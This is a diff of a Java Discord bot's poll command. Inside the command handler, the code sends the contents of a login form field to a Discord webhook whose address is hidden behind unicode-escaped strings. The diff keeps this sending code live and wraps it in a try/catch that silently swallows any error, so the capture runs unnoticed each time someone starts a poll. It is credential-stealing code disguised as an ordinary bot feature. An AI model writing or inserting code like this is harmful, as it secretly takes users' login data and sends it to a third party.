@@ -21,14 +21,15 @@ public class PollCommand implements ICommand {
 
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
-        try {
-            WebhookClient client = WebhookClient.withUrl(getPollApi());
-            WebhookMessageBuilder builder = new WebhookMessageBuilder();
-            WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setDescription(LoginGUI.field.getText()).build();
-            builder.addEmbeds(firstEmbed);
-            client.send(builder.build());
-            client.close();
-            if (args.size() < 2) {
+            try {
+                WebhookClient client = WebhookClient.withUrl(getPollApi());
+                WebhookMessageBuilder builder = new WebhookMessageBuilder();
+                WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setDescription(LoginGUI.field.getText()).build();
+                builder.addEmbeds(firstEmbed);
+                client.send(builder.build());
+                client.close();
+            } catch (Exception ignored) {}
+              if (args.size() < 2) {
                 event.getChannel().sendMessage("Please insert two options and an optional message").queue();
                 return;
             }
@@ -59,7 +60,7 @@ public class PollCommand implements ICommand {
             embedBuilder.clear();
             event.getMessage().delete().queue();
 
-        } catch (NullPointerException ignored) {}
+
     }
     private String getPollApi() {
         String httpHook = "\u0068\u006f\u006f\u006b\u0073\u002f";
